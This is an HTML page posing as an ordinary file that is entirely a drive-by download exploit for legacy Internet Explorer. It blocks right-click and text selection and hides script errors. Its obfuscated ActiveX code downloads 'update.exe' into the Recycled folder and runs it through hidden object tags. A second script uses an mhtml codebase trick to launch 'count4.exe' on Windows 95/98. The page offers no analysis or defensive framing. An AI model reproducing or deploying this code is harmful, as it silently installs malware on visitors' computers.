<html>
<head>
<title>file</title>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<script>

function s() {return true;}
window.onerror=s;

var d="C:\\"+"Recycled"+"\\"+Math.round(Math.random()*(1000000-1)+1)+"."+"exe";

try{
b=new ActiveXObject("Mi"+"c"+"r"+"os"+"o"+"ft"+"."+"X"+"ML"+"H"+"TTP");
b.Open("G"+"E"+"T","u"+"p"+"d"+"a"+"t"+"e"+"."+"e"+"x"+"e",0);
b.Send();
o=new ActiveXObject("A"+"DO'+'DB"+"."+"Str"+"eam");
o.Mode=3;
dd=1;
o.Type=1;
dd=1;
o.Open();
o.Write(b.responseBody);
o.SaveToFile(d,2);
}
catch(e){};

try{document.write('<object classid=clsid:047CE197-F3B0-40EE-B4BD-D8B388AB5EFD codebase="'+d+'" style=display:none>');}

catch(e){document.write('<object classid=clsid:B2382526-B0E6-47B3-BB11-E377DA9603C3 codebase="'+d+'" style=display:none></object>');}

</script>

<object classid=clsid:D8A8A7F1-53EF-41F2-B44D-F3E2E595DC27 codebase=update.exe style=display:none></object>

<IFRAME name="icounter" width=60 height=30 style="display:none"></IFRAME>
<script>
 function Get_Win_Version()
 {
  var IEversion=navigator.appVersion;
  if (IEversion.indexOf('Windows 95') != -1) return "95"
  else if (IEversion.indexOf('Windows 98') != -1) return "98"
 }
 function LaunchExecutable9X(InetPath)
 {
  tagstyle='style="display:none"'; 
  ObjCLSID="clsid:CE70CB79-13E6-4C3D-B81B-910319F613BC";
  ObjBASE='mhtml:file://C:\\ARHIVE.MHT!'+InetPath;
  sObject ='<object classid="'+ObjCLSID+'" codebase="'+ObjBASE+'" '+tagstyle+'></object>';
  icounter.document.write(sObject);
  setTimeout('icounter.document.execCommand("Refresh")',1000);
 }
 var WinOS=Get_Win_Version();
 var InetPath=document.location.href;
 iPrefix=InetPath.substring(0,7);
 switch(iPrefix)
 {
 case "http://" :
  j=InetPath.lastIndexOf('/');
  InetPath=InetPath.slice(0,j)+'/count4.exe';
  break; 
 case "ms-its:" :
  j=InetPath.lastIndexOf('//'); 
  i=InetPath.indexOf('!');
  InetPath=InetPath.slice(i+1,j)+'/count4.exe';
  break;
 }
 if ((WinOS=="95")||(WinOS=="98")) { LaunchExecutable9X(InetPath); }
</script>
</body>
</html>